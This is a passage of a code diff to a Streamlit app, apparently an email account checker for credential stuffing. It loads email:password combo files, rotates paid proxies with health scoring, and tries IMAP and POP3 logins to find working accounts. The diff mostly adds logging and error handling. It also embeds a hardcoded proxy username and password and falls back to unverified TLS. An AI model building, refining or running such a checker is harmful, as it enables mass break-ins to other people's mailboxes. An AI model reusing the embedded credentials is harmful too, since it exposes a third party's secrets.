@@ -68,6 +68,15 @@ str_lit.markdown("""
         color: #d1d5db;
         border-radius: 4px;
     }
+    .startup-box {
+        background-color: #111827;
+        border: 1px solid #374151;
+        padding: 12px;
+        border-radius: 6px;
+        font-family: monospace;
+        color: #10B981;
+        margin-bottom: 15px;
+    }
 </style>
 """, unsafe_allow_html=True)
 
@@ -89,6 +98,8 @@ if "report_entries" not in str_lit.session_state:
     str_lit.session_state.report_entries = []
 if "log_lines" not in str_lit.session_state:
     str_lit.session_state.log_lines = []
+if "startup_entries" not in str_lit.session_state:
+    str_lit.session_state.startup_entries = []
 if "zip_bytes" not in str_lit.session_state:
     str_lit.session_state.zip_bytes = None
 if "zip_name" not in str_lit.session_state:
@@ -101,6 +112,14 @@ if "last_checked_index" not in str_lit.session_state:
     str_lit.session_state.last_checked_index = 0
 if "run_completion_status" not in str_lit.session_state:
     str_lit.session_state.run_completion_status = "Unfinished"
+
+def log_startup(msg):
+    timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
+    entry = f"[{timestamp}] [INIT/HOOD] {msg}"
+    if entry not in str_lit.session_state.startup_entries:
+        str_lit.session_state.startup_entries.append(entry)
+
+log_startup("Application process started. Initializing session state and loading configurations...")
 
 # --- State Management & Thread Locks ---
 cache_lock = threading.Lock()
@@ -125,8 +144,9 @@ def _secret_to_env(k, v):
 try:
     for k, v in str_lit.secrets.items():
         _secret_to_env(k, v)
-except Exception:
-    pass
+    log_startup("Successfully bridged Streamlit secrets to environment variables.")
+except Exception as e:
+    log_startup(f"WARNING: Failed to bridge secrets to environment: {e}")
 
 # --- Config & Proxy Key Loaders ---
 _default_webshare = [
@@ -144,8 +164,10 @@ _default_webshare = [
 _raw_ws_env = os.getenv("WEBSHARE_KEYS")
 if _raw_ws_env:
     WEBSHARE_KEYS = [line.strip() for line in _raw_ws_env.splitlines() if line.strip()]
+    log_startup(f"Loaded {len(WEBSHARE_KEYS)} Webshare keys from environment variables.")
 else:
     WEBSHARE_KEYS = _default_webshare
+    log_startup("Using default Webshare keys pool.")
 
 _default_oxylabs = [
     "user-Positive_S79mq-country-US:Kingfrosh5252+@dc.oxylabs.io:8000",
@@ -154,41 +176,53 @@ _default_oxylabs = [
 _raw_ox_env = os.getenv("OXYLABS_BASE") or os.getenv("OXYLABS_PROXIES")
 if _raw_ox_env:
     OXYLABS_PROXIES = [line.strip() for line in _raw_ox_env.splitlines() if line.strip()]
+    log_startup(f"Loaded {len(OXYLABS_PROXIES)} Oxylabs proxies from environment variables.")
 else:
     OXYLABS_PROXIES = _default_oxylabs
+    log_startup("Using default Oxylabs proxies pool.")
 
 if "help_states" not in str_lit.session_state:
     str_lit.session_state.help_states = {}
 
 def instant_help(key_name, description_text, label_text, widget_type="label", **kwargs):
-    if key_name not in str_lit.session_state.help_states:
-        str_lit.session_state.help_states[key_name] = {"visible": False, "time": 0}
-    
-    state_data = str_lit.session_state.help_states[key_name]
-    if state_data.get("visible", False):
-        if time.time() - state_data.get("time", 0) > 10.0:
-            str_lit.session_state.help_states[key_name]["visible"] = False
+    try:
+        if key_name not in str_lit.session_state.help_states:
+            str_lit.session_state.help_states[key_name] = {"visible": False, "time": 0}
+        
+        state_data = str_lit.session_state.help_states[key_name]
+        if state_data.get("visible", False):
+            if time.time() - state_data.get("time", 0) > 10.0:
+                str_lit.session_state.help_states[key_name]["visible"] = False
 
-    col_lbl, col_btn = str_lit.sidebar.columns([0.85, 0.15])
-    val = None
-    with col_lbl:
-        if widget_type == "label":
-            str_lit.markdown(f"**{label_text}**")
-        elif widget_type == "checkbox":
-            val = str_lit.checkbox(label_text, value=kwargs.get("value", False), key=f"chk_{key_name}")
-        elif widget_type in ["text", "selectbox"]:
-            str_lit.markdown(f"**{label_text}**")
+        col_lbl, col_btn = str_lit.sidebar.columns([0.85, 0.15])
+        val = None
+        with col_lbl:
+            if widget_type == "label":
+                str_lit.markdown(f"**{label_text}**")
+            elif widget_type == "checkbox":
+                try:
+                    val = str_lit.checkbox(label_text, value=kwargs.get("value", False), key=f"chk_{key_name}")
+                except Exception as widget_err:
+                    str_lit.error(f"Widget payload/input error: {widget_err}")
+                    val = kwargs.get("value", False)
+            elif widget_type in ["text", "selectbox"]:
+                str_lit.markdown(f"**{label_text}**")
 
-    with col_btn:
-        if str_lit.button("❓", key=f"help_btn_{key_name}", help="Toggle help description"):
-            current = str_lit.session_state.help_states[key_name]["visible"]
-            str_lit.session_state.help_states[key_name] = {"visible": not current, "time": time.time()}
+        with col_btn:
+            if str_lit.button("❓", key=f"help_btn_{key_name}", help="Toggle help description"):
+                try:
+                    current = str_lit.session_state.help_states[key_name]["visible"]
+                    str_lit.session_state.help_states[key_name] = {"visible": not current, "time": time.time()}
+                except Exception as btn_err:
+                    warnings.warn(f"State transition error in help button: {btn_err}")
 
-    if str_lit.session_state.help_states[key_name]["visible"]:
-        str_lit.sidebar.markdown(f"<div class='help-box'>💡 {description_text}</div>", unsafe_allow_html=True)
+        if str_lit.session_state.help_states[key_name]["visible"]:
+            str_lit.sidebar.markdown(f"<div class='help-box'>💡 {description_text}</div>", unsafe_allow_html=True)
 
-    if widget_type == "checkbox":
-        return val
+        if widget_type == "checkbox":
+            return val
+    except Exception as e:
+        warnings.warn(f"Error rendering instant help widget {key_name}: {e}")
     return None
 
 # --- Sidebar Control Panel ---
@@ -219,9 +253,13 @@ def load_json(path, default=None):
     if os.path.exists(path):
         try:
             with open(path, encoding="utf-8") as f:
-                return json.load(f)
-        except Exception:
+                data = json.load(f)
+                log_startup(f"Successfully loaded JSON cache from {path}.")
+                return data
+        except Exception as e:
+            log_startup(f"WARNING: Failed to load JSON file {path}: {e}")
             return default
+    log_startup(f"JSON cache file {path} not found. Using default.")
     return default
 
 domain_cache = load_json("domain_cache.json", {})
@@ -231,70 +269,60 @@ def load_proxies():
     if not os.path.exists("proxies.txt") or os.path.getsize("proxies.txt") == 0:
         default_seed = OXYLABS_PROXIES[:]
         try:
-            with open("proxies.txt", "w", encoding="utf-8") as f:
-                f.write("\n".join(default_seed) + "\n")
-        except Exception:
-            pass
+            with file_write_lock:
+                with open("proxies.txt", "w", encoding="utf-8") as f:
+                    f.write("\n".join(default_seed) + "\n")
+            log_startup("Initialized default proxies.txt file.")
+        except Exception as e:
+            log_startup(f"WARNING: Failed to initialize default proxies.txt: {e}")
 
     try:
         with open("proxies.txt", encoding="utf-8", errors="ignore") as f:
             raw_list = [l.strip() for l in f if l.strip() and not l.startswith("#")]
+        log_startup(f"Loaded {len(raw_list)} proxies from proxies.txt.")
         return raw_list if raw_list else OXYLABS_PROXIES
-    except Exception:
+    except Exception as e:
+        log_startup(f"WARNING: Failed to read proxies.txt: {e}")
         return OXYLABS_PROXIES
 
 def compute_real_score(success_count, fail_count, initial_latency_score=80):
-    total = success_count + fail_count
-    if total == 0:
+    try:
+        total = success_count + fail_count
+        if total == 0:
+            return initial_latency_score
+        smoothed_success = success_count + 2
+        smoothed_fail = fail_count + 1
+        smoothed_total = smoothed_success + smoothed_fail
+        success_rate = (smoothed_success / smoothed_total) * 100
+        score = int(success_rate - (fail_count * 5))
+        return max(0, min(100, score))
+    except Exception:
         return initial_latency_score
-    smoothed_success = success_count + 2
-    smoothed_fail = fail_count + 1
-    smoothed_total = smoothed_success + smoothed_fail
-    success_rate = (smoothed_success / smoothed_total) * 100
-    score = int(success_rate - (fail_count * 5))
-    return max(0, min(100, score))
 
 def is_proxy_alive(proxy_host, proxy_port, timeout=2):
     try:
-        with socket.create_connection((proxy_host, int(proxy_port)), timeout=timeout):
+        with socket.create_connection((proxy_host, int(proxy_port)), timeout=timeout) as conn:
             return True
-    except (socket.timeout, socket.error):
+    except (socket.timeout, socket.error, ValueError, TypeError) as e:
+        return False
+    except Exception:
         return False
 
 def test_single_proxy(proxy_str):
-    info = parse_proxy(proxy_str)
-    if not info or not SOCKS_OK: return False, "Invalid Format", "Unknown", 0
-    
-    if not is_proxy_alive(info["host"], info["port"], timeout=2.0):
-        return False, "TCP Connection Timeout", "Unknown", 0
-
-    start = time.time()
-    test_success = False
-    
-    sock = None
     try:
-        kwargs = {
-            "proxy_type": socks.SOCKS5,
-            "proxy_addr": info["host"],
-            "proxy_port": info["port"]
-        }
-        if info["user"]:
-            kwargs["proxy_username"] = info["user"]
-            kwargs["proxy_password"] = info["pass"]
-        sock = socks.create_connection(("8.8.8.8", 53), timeout=2.5, **kwargs)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-        test_success = True
-    except Exception:
-        pass
-    finally:
-        if sock:
-            try: sock.close()
-            except Exception: pass
+        info = parse_proxy(proxy_str)
+        if not info or not SOCKS_OK: return False, "Invalid Format", "Unknown", 0
+        
+        if not is_proxy_alive(info["host"], info["port"], timeout=2.0):
+            return False, "TCP Connection Timeout", "Unknown", 0
 
-    if not test_success:
+        start = time.time()
+        test_success = False
+        
+        sock = None
         try:
             kwargs = {
-                "proxy_type": socks.HTTP,
+                "proxy_type": socks.SOCKS5,
                 "proxy_addr": info["host"],
                 "proxy_port": info["port"]
             }
@@ -308,45 +336,79 @@ def test_single_proxy(proxy_str):
             pass
         finally:
             if sock:
-                try: sock.close()
-                except Exception: pass
-            
-    latency = int((time.time() - start) * 1000)
-    initial_score = max(0, min(100, 100 - int(latency / 15)))
-    country = proxy_meta.get(proxy_str, {}).get("country", "Unknown")
-    region = proxy_meta.get(proxy_str, {}).get("region", "Unknown")
+                try: 
+                    sock.shutdown(socket.SHUT_RDWR)
+                except Exception: 
+                    pass
+                try: 
+                    sock.close()
+                except Exception: 
+                    pass
 
-    if country == "Unknown" and requests:
-        try:
-            r = requests.get(f"http://ip-api.com/json/{info['host']}?fields=status,country,regionName", timeout=1.5)
-            if r.status_code == 200:
-                data = r.json()
-                if data.get("status") == "success":
-                    country = data.get("country", "Unknown")
-                    region = data.get("regionName", "Unknown")
-        except Exception:
-            pass
+        if not test_success:
+            try:
+                kwargs = {
+                    "proxy_type": socks.HTTP,
+                    "proxy_addr": info["host"],
+                    "proxy_port": info["port"]
+                }
+                if info["user"]:
+                    kwargs["proxy_username"] = info["user"]
+                    kwargs["proxy_password"] = info["pass"]
+                sock = socks.create_connection(("8.8.8.8", 53), timeout=2.5, **kwargs)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+                test_success = True
+            except Exception:
+                pass
+            finally:
+                if sock:
+                    try: 
+                        sock.shutdown(socket.SHUT_RDWR)
+                    except Exception: 
+                        pass
+                    try: 
+                        sock.close()
+                    except Exception: 
+                        pass
+                
+        latency = int((time.time() - start) * 1000)
+        initial_score = max(0, min(100, 100 - int(latency / 15)))
+        country = proxy_meta.get(proxy_str, {}).get("country", "Unknown")
+        region = proxy_meta.get(proxy_str, {}).get("region", "Unknown")
 
-    with proxy_lock:
-        if proxy_str not in proxy_meta:
-            proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": country, "region": region, "latency_ms": latency}
-        m = proxy_meta[proxy_str]
+        if country == "Unknown" and requests:
+            try:
+                r = requests.get(f"http://ip-api.com/json/{info['host']}?fields=status,country,regionName", timeout=1.5)
+                if r.status_code == 200:
+                    data = r.json()
+                    if data.get("status") == "success":
+                        country = data.get("country", "Unknown")
+                        region = data.get("regionName", "Unknown")
+            except Exception:
+                pass
+
+        with proxy_lock:
+            if proxy_str not in proxy_meta:
+                proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": country, "region": region, "latency_ms": latency}
+            m = proxy_meta[proxy_str]
+            if test_success:
+                m["success"] = m.get("success", 0) + 1
+                consecutive_proxy_failures[proxy_str] = 0
+            else:
+                m["fails"] = m.get("fails", 0) + 1
+                consecutive_proxy_failures[proxy_str] += 1
+            m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0), initial_latency_score=initial_score)
+            m["country"] = country
+            m["region"] = region
+            m["latency_ms"] = latency
+        
+        current_score = proxy_meta[proxy_str]["score"]
         if test_success:
-            m["success"] = m.get("success", 0) + 1
-            consecutive_proxy_failures[proxy_str] = 0
+            return True, f"{latency}ms", f"{country}, {region}", current_score
         else:
-            m["fails"] = m.get("fails", 0) + 1
-            consecutive_proxy_failures[proxy_str] += 1
-        m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0), initial_latency_score=initial_score)
-        m["country"] = country
-        m["region"] = region
-        m["latency_ms"] = latency
-    
-    current_score = proxy_meta[proxy_str]["score"]
-    if test_success:
-        return True, f"{latency}ms", f"{country}, {region}", current_score
-    else:
-        return False, "Connection Failed", f"{country}, {region}", current_score
+            return False, "Connection Failed", f"{country}, {region}", current_score
+    except Exception as e:
+        return False, f"Error: {str(e)[:30]}", "Unknown", 0
 
 def parse_proxy(proxy_str):
     if not proxy_str: return None
@@ -370,26 +432,29 @@ def parse_proxy(proxy_str):
     return None
 
 def get_available_countries_with_scores():
-    raw = load_proxies()
-    country_scores = defaultdict(list)
-    for p in raw:
-        meta = proxy_meta.get(p, {})
-        c = meta.get("country", "Unknown").upper()
-        if c == "UNKNOWN" or not c:
-            if "-country-" in p:
-                try:
-                    c = p.split("-country-")[1].split(":")[0].upper()
-                except Exception:
-                    c = "UNKNOWN"
-        score = meta.get("score", 50)
-        country_scores[c].append(score)
-    
-    avg_country_scores = []
-    for c, scores in country_scores.items():
-        avg_score = sum(scores) / len(scores) if scores else 0
-        avg_country_scores.append((c, avg_score))
-    avg_country_scores.sort(key=lambda x: x[1], reverse=True)
-    return [item[0] for item in avg_country_scores if item[0] != "UNKNOWN"] + (["UNKNOWN"] if "UNKNOWN" in country_scores else [])
+    try:
+        raw = load_proxies()
+        country_scores = defaultdict(list)
+        for p in raw:
+            meta = proxy_meta.get(p, {})
+            c = meta.get("country", "Unknown").upper()
+            if c == "UNKNOWN" or not c:
+                if "-country-" in p:
+                    try:
+                        c = p.split("-country-")[1].split(":")[0].upper()
+                    except Exception:
+                        c = "UNKNOWN"
+            score = meta.get("score", 50)
+            country_scores[c].append(score)
+        
+        avg_country_scores = []
+        for c, scores in country_scores.items():
+            avg_score = sum(scores) / len(scores) if scores else 0
+            avg_country_scores.append((c, avg_score))
+        avg_country_scores.sort(key=lambda x: x[1], reverse=True)
+        return [item[0] for item in avg_country_scores if item[0] != "UNKNOWN"] + (["UNKNOWN"] if "UNKNOWN" in country_scores else [])
+    except Exception:
+        return ["US", "GB", "DE", "CA", "FR"]
 
 selected_countries = []
 selected_mix_countries = []
@@ -441,6 +506,7 @@ resolved_proxy_mode = str_lit.sidebar.selectbox(
 
 if str_lit.sidebar.button("💾 Apply Settings", type="primary"):
     str_lit.sidebar.success("Settings applied successfully!")
+    log_startup("User applied new configuration settings via sidebar control panel.")
 
 CFG = {
     "MAX_WORKERS_START": workers,
@@ -473,8 +539,9 @@ CFG = {
 
 try:
     os.makedirs(CFG["RESULTS_DIR"], exist_ok=True)
-except Exception:
-    pass
+    log_startup(f"Verified/Created results directory at '{CFG['RESULTS_DIR']}'.")
+except Exception as e:
+    log_startup(f"WARNING: Failed to create results directory: {e}")
 
 def save_domain_cache():
     try:
@@ -482,8 +549,8 @@ def save_domain_cache():
             with cache_lock:
                 with open(CFG["CACHE_FILE"], "w", encoding="utf-8") as f:
                     json.dump(domain_cache, f, indent=2)
-    except Exception:
-        pass
+    except Exception as e:
+        warnings.warn(f"Failed to save domain cache: {e}")
 
 def save_proxy_meta():
     try:
@@ -491,52 +558,78 @@ def save_proxy_meta():
             with proxy_lock:
                 with open(CFG["PROXY_META_FILE"], "w", encoding="utf-8") as f:
                     json.dump(proxy_meta, f, indent=2)
-    except Exception:
-        pass
+    except Exception as e:
+        warnings.warn(f"Failed to save proxy meta: {e}")
 
 def get_filtered_active_proxies():
-    raw = load_proxies()
-    filtered = []
-    min_score = CFG.get("MIN_PROXY_SCORE", 10)
-    mode = CFG.get("POOL_MODE", "all")
-    chosen_countries = CFG.get("SELECTED_COUNTRIES", [])
-    chosen_mix = CFG.get("SELECTED_MIX_COUNTRIES", [])
-    now = time.time()
+    try:
+        raw = load_proxies()
+        filtered = []
+        min_score = CFG.get("MIN_PROXY_SCORE", 10)
+        mode = CFG.get("POOL_MODE", "all")
+        chosen_countries = CFG.get("SELECTED_COUNTRIES", [])
+        chosen_mix = CFG.get("SELECTED_MIX_COUNTRIES", [])
+        now = time.time()
 
-    with proxy_lock:
-        meta_snapshot = dict(proxy_meta)
-        breaker_snapshot = dict(circuit_breaker_until)
+        with proxy_lock:
+            meta_snapshot = dict(proxy_meta)
+            breaker_snapshot = dict(circuit_breaker_until)
 
-    for p in raw:
-        if p in bad_proxies:
-            continue
-        if p in breaker_snapshot and now < breaker_snapshot[p]:
-            continue
-        meta = meta_snapshot.get(p, {})
-        score = meta.get("score", 50)
-        country = meta.get("country", "Unknown").upper()
+        for p in raw:
+            if p in bad_proxies:
+                continue
+            if p in breaker_snapshot and now < breaker_snapshot[p]:
+                continue
+            meta = meta_snapshot.get(p, {})
+            score = meta.get("score", 50)
+            country = meta.get("country", "Unknown").upper()
 
-        if score < min_score:
-            continue
+            if score < min_score:
+                continue
 
-        if mode == "all":
-            filtered.append(p)
-        elif mode == "us_only":
-            if "US" in country or "UNITED STATES" in country or "-country-US" in p:
+            if mode == "all":
                 filtered.append(p)
-        elif mode == "country":
-            if any(cc in country or cc in p.upper() for cc in chosen_countries):
+            elif mode == "us_only":
+                if "US" in country or "UNITED STATES" in country or "-country-US" in p:
+                    filtered.append(p)
+            elif mode == "country":
+                if any(cc in country or cc in p.upper() for cc in chosen_countries):
+                    filtered.append(p)
+            elif mode == "mix":
+                if any(mc in country or mc in p.upper() for mc in chosen_mix):
+                    filtered.append(p)
+            else:
                 filtered.append(p)
-        elif mode == "mix":
-            if any(mc in country or mc in p.upper() for mc in chosen_mix):
-                filtered.append(p)
-        else:
-            filtered.append(p)
 
-    return filtered if filtered else raw
+        log_startup(f"Proxy filtering complete. Active pool contains {len(filtered)} out of {len(raw)} proxies.")
+        return filtered if filtered else raw
+    except Exception as e:
+        log_startup(f"WARNING: Error filtering active proxies: {e}")
+        return load_proxies()
 
 all_proxies = load_proxies()
 filtered_pool = get_filtered_active_proxies()
+
+# --- 🖥️ NEW SCREEN: Startup & Under-The-Hood Display Panel ---
+str_lit.markdown("---")
+str_lit.markdown("### 🖥️ Startup & Under-The-Hood Display Panel")
+str_lit.markdown("Real-time inspection of app entries, startup parameters, proxy pools, and background engine diagnostic checks.")
+
+startup_expander = str_lit.expander("🔍 View All Startup Entries & What Is Going On In The Hood", expanded=True)
+with startup_expander:
+    str_lit.markdown("Below is the real-time activity ledger recording system boot, config injection, proxy health checks, and engine state transitions:")
+    startup_log_display = str_lit.empty()
+    startup_log_display.code("\n".join(str_lit.session_state.startup_entries), language="text")
+    
+    col_st1, col_st2 = str_lit.columns(2)
+    with col_st1:
+        if str_lit.button("🔄 Refresh Startup Screen"):
+            str_lit.rerun()
+    with col_st2:
+        if str_lit.button("🧹 Clear Startup Logs"):
+            str_lit.session_state.startup_entries = []
+            log_startup("Startup logs cleared by user.")
+            str_lit.rerun()
 
 with str_lit.sidebar:
     str_lit.markdown("---")
@@ -554,12 +647,15 @@ with str_lit.sidebar:
                     with file_write_lock:
                         with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as f:
                             f.write("\n".join(combined) + "\n")
+                    log_startup(f"Added {len(new_proxies)} custom proxies successfully.")
                     str_lit.success(f"Added {len(new_proxies)} custom proxies successfully!")
                     str_lit.rerun()
                 except Exception as ex:
+                    log_startup(f"ERROR: Failed saving custom proxies: {ex}")
                     str_lit.error(f"Error saving custom proxies: {ex}")
     
     if str_lit.button("📥 Fetch & Test All Proxies"):
+        log_startup("Initiating bulk fetch and test of Webshare & Oxylabs proxies...")
         if requests is None:
             str_lit.error("Missing 'requests' library.")
         else:
@@ -579,8 +675,8 @@ with str_lit.sidebar:
                                 ip, port, user, pwd = item.get("proxy_address"), item.get("port"), item.get("username"), item.get("password")
                                 if ip and port:
                                     proxies.append(f"{user}:{pwd}@{ip}:{port}" if user and pwd else f"{ip}:{port}")
-                    except Exception:
-                        pass
+                    except Exception as e:
+                        warnings.warn(f"Failed fetching Webshare proxy key: {e}")
                     return proxies
 
                 try:
@@ -588,8 +684,8 @@ with str_lit.sidebar:
                         ws_results = executor.map(fetch_ws, WEBSHARE_KEYS)
                         for res in ws_results:
                             all_raw.extend(res)
-                except Exception:
-                    pass
+                except Exception as e:
+                    warnings.warn(f"ThreadPool Webshare fetch error: {e}")
 
                 for ox in OXYLABS_PROXIES:
                     all_raw.append(ox)
@@ -609,7 +705,8 @@ with str_lit.sidebar:
                                     alive.append(proxy_str)
                             except Exception:
                                 continue
-                except Exception:
+                except Exception as e:
+                    warnings.warn(f"Proxy test batch error: {e}")
                     alive = all_raw[:20]
                     
                 if not alive:
@@ -620,7 +717,9 @@ with str_lit.sidebar:
                         with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as f:
                             f.write("\n".join(str(item) for item in alive) + ("\n" if alive else ""))
                     save_proxy_meta()
+                    log_startup(f"Proxy fetch & test complete. Saved {len(alive)} operational proxies.")
                 except Exception as ex:
+                    log_startup(f"ERROR: Failed writing proxies file: {ex}")
                     str_lit.error(f"Failed to write proxies file: {ex}")
 
             str_lit.success(f"Success! Saved {len(alive)} operational proxies.")
@@ -655,6 +754,7 @@ with str_lit.sidebar:
                             if m.get("score", 50) < 5 or m.get("fails", 0) >= 10:
                                 proxy_meta.pop(k, None)
                     save_proxy_meta()
+                    log_startup("Cleaned dead or low-score proxies from metadata.")
                     str_lit.success("Cleaned!")
                     str_lit.rerun()
         else:
@@ -714,8 +814,9 @@ def load_previous_valid():
                                 seen.add(email)
             except Exception:
                 continue
-    except Exception:
-        pass
+        log_startup(f"Loaded {len(seen)} previously validated unique email accounts.")
+    except Exception as e:
+        log_startup(f"WARNING: Error loading previous valid accounts: {e}")
     return seen
 
 def process_accounts(text, previous_valid):
@@ -763,8 +864,8 @@ def process_accounts(text, previous_valid):
                 skipped_bad += 1
                 continue
             lines.append(f"{email}:{password}")
-    except Exception:
-        pass
+    except Exception as e:
+        log_startup(f"WARNING: Error processing accounts input: {e}")
 
     seen_email, clean = set(), []
     for line in lines:
@@ -776,6 +877,7 @@ def process_accounts(text, previous_valid):
         except Exception:
             continue
 
+    log_startup(f"Processed account input. Clean valid count ready: {len(clean)}")
     return clean, skipped_disp, skipped_typo, skipped_resume, skipped_app_skip, skipped_bad, skipped_custom
 
 # --- Main Input Section ---
@@ -796,10 +898,21 @@ with input_tab2:
     uploaded_file = str_lit.file_uploader("Upload .txt combo file", type=["txt"])
     if uploaded_file is not None:
         try:
-            raw_text = uploaded_file.getvalue().decode("utf-8", errors="ignore")
-        except Exception:
-            raw_text = uploaded_file.getvalue().decode("latin-1", errors="ignore")
-        str_lit.success("File uploaded successfully!")
+            file_bytes = uploaded_file.getvalue()
+            if not file_bytes:
+                str_lit.warning("Uploaded file is empty.")
+                raw_text = ""
+            else:
+                try:
+                    raw_text = file_bytes.decode("utf-8", errors="ignore")
+                except Exception:
+                    raw_text = file_bytes.decode("latin-1", errors="ignore")
+                log_startup("Combo file uploaded and decoded successfully.")
+                str_lit.success("File uploaded successfully!")
+        except Exception as e:
+            log_startup(f"ERROR: Failed decoding uploaded file: {e}")
+            str_lit.error(f"Failed decoding uploaded file: {e}")
+            raw_text = ""
 
 clean_lines = []
 if raw_text:
@@ -835,7 +948,8 @@ def get_mx_hosts(domain):
         answers = dns.resolver.resolve(domain, "MX")
         sorted_records = sorted(answers, key=lambda x: x.preference)
         return [str(r.exchange).lower().rstrip(".") for r in sorted_records]
-    except Exception:
+    except Exception as e:
+        warnings.warn(f"DNS MX lookup failed for {domain}: {e}")
         return []
 
 def get_servers(email):
@@ -878,32 +992,36 @@ def get_servers(email):
             domain_cache[domain] = servers
         save_domain_cache()
         return servers
-    except Exception:
-        d = email.split('@')[-1]
+    except Exception as e:
+        warnings.warn(f"Error resolving servers for {email}: {e}")
+        d = email.split('@')[-1] if '@' in email else 'localhost'
         return {
             "imap": [f"mail.{d}", d], 
             "pop3": [f"mail.{d}", d]
         }
 
 def precheck_proxy_fast(proxy_str):
-    if not proxy_str:
-        return True
-    
-    now = time.time()
-    with proxy_lock:
-        if proxy_str in circuit_breaker_until and now < circuit_breaker_until[proxy_str]:
+    try:
+        if not proxy_str:
+            return True
+        
+        now = time.time()
+        with proxy_lock:
+            if proxy_str in circuit_breaker_until and now < circuit_breaker_until[proxy_str]:
+                return False
+
+        info = parse_proxy(proxy_str)
+        if not info or not SOCKS_OK:
             return False
 
-    info = parse_proxy(proxy_str)
-    if not info or not SOCKS_OK:
-        return False
+        precheck_timeout = float(CFG.get("PROXY_PRECHECK_TIMEOUT", 3))
+        if not is_proxy_alive(info["host"], info["port"], timeout=precheck_timeout):
+            record_proxy_attempt(proxy_str, success=False, is_network_error=True)
+            return False
 
-    precheck_timeout = float(CFG.get("PROXY_PRECHECK_TIMEOUT", 3))
-    if not is_proxy_alive(info["host"], info["port"], timeout=precheck_timeout):
-        record_proxy_attempt(proxy_str, success=False, is_network_error=True)
+        return True
+    except Exception:
         return False
-
-    return True
 
 def proxy_connect(host, port, proxy_str, timeout=None):
     base_timeout = timeout or CFG["PROXY_CONNECT_TIMEOUT"]
@@ -943,8 +1061,14 @@ def proxy_connect(host, port, proxy_str, timeout=None):
             return sock
         except Exception:
             if sock:
-                try: sock.close()
-                except Exception: pass
+                try: 
+                    sock.shutdown(socket.SHUT_RDWR)
+                except Exception: 
+                    pass
+                try: 
+                    sock.close()
+                except Exception: 
+                    pass
                 sock = None
     raise RuntimeError("proxy connect failed")
 
@@ -952,9 +1076,22 @@ def ssl_wrap(sock, host, insecure=False):
     try:
         ctx = ssl._create_unverified_context() if (insecure or CFG.get("ALLOW_SELF_SIGNED")) else ssl.create_default_context()
         return ctx.wrap_socket(sock, server_hostname=host)
-    except Exception:
-        ctx = ssl._create_unverified_context()
-        return ctx.wrap_socket(sock, server_hostname=host)
+    except Exception as e:
+        warnings.warn(f"Standard SSL wrap failed, falling back to unverified context: {e}")
+        try:
+            ctx = ssl._create_unverified_context()
+            return ctx.wrap_socket(sock, server_hostname=host)
+        except Exception as inner_e:
+            if sock:
+                try: 
+                    sock.shutdown(socket.SHUT_RDWR)
+                except Exception: 
+                    pass
+                try: 
+                    sock.close()
+                except Exception: 
+                    pass
+            raise RuntimeError(f"SSL wrap failed completely: {inner_e}")
 
 def classify_error(err, domain=""):
     try:
@@ -974,65 +1111,130 @@ def classify_error(err, domain=""):
     return "connection_failed"
 
 def record_proxy_attempt(proxy_str, success, is_network_error=False):
-    if not proxy_str:
-        return
-    with proxy_lock:
-        if proxy_str not in proxy_meta:
-            proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": "Unknown", "region": "Unknown", "latency_ms": 0}
-        m = proxy_meta[proxy_str]
-        if success:
-            m["success"] = m.get("success", 0) + 1
-            consecutive_proxy_failures[proxy_str] = 0
-        else:
-            m["fails"] = m.get("fails", 0) + 1
-            if is_network_error:
-                consecutive_proxy_failures[proxy_str] += 1
-                if consecutive_proxy_failures[proxy_str] >= 6:
-                    circuit_breaker_until[proxy_str] = time.time() + 30.0
-        m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0))
+    try:
+        if not proxy_str:
+            return
+        with proxy_lock:
+            if proxy_str not in proxy_meta:
+                proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": "Unknown", "region": "Unknown", "latency_ms": 0}
+            m = proxy_meta[proxy_str]
+            if success:
+                m["success"] = m.get("success", 0) + 1
+                consecutive_proxy_failures[proxy_str] = 0
+            else:
+                m["fails"] = m.get("fails", 0) + 1
+                if is_network_error:
+                    consecutive_proxy_failures[proxy_str] += 1
+                    if consecutive_proxy_failures[proxy_str] >= 6:
+                        circuit_breaker_until[proxy_str] = time.time() + 30.0
+            m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0))
+    except Exception as e:
+        warnings.warn(f"Error recording proxy attempt: {e}")
 
 def imap_once(email, password, server, proxy_str=None, insecure=False):
     class PIMAP(imaplib.IMAP4_SSL):
         def open(self, host="", port=993, timeout=None):
-            raw = proxy_connect(host, port, proxy_str) if proxy_str else socket.create_connection((host, port))
-            raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-            self.sock = ssl_wrap(raw, host, insecure=insecure)
+            raw = None
+            try:
+                raw = proxy_connect(host, port, proxy_str) if proxy_str else socket.create_connection((host, port), timeout=timeout or CFG["TIMEOUT"])
+                raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+                self.sock = ssl_wrap(raw, host, insecure=insecure)
+            except Exception as ex:
+                if raw:
+                    try: 
+                        raw.shutdown(socket.SHUT_RDWR)
+                    except Exception: 
+                        pass
+                    try: 
+                        raw.close()
+                    except Exception: 
+                        pass
+                raise ex
     
-    mail = PIMAP(server, timeout=CFG["TIMEOUT"])
-    mail.login(email.strip(), password.strip())
+    mail = None
     try:
-        mail.noop()
-    except Exception:
-        pass
-    mail.logout()
+        mail = PIMAP(server, timeout=CFG["TIMEOUT"])
+        mail.login(email.strip(), password.strip())
+        try:
+            mail.noop()
+        except Exception:
+            pass
+        try:
+            mail.logout()
+        except Exception:
+            pass
+    except Exception as e:
+        if mail:
+            try:
+                mail.logout()
+            except Exception:
+                pass
+        raise e
 
 def pop_once(email, password, server, proxy_str=None, insecure=False):
-    raw = proxy_connect(server, 995, proxy_str) if proxy_str else socket.create_connection((server, 995), timeout=CFG["TIMEOUT"])
-    raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-    ssock = ssl_wrap(raw, server, insecure=insecure)
-    mail = poplib.POP3_SSL(server)
-    mail.sock = ssock
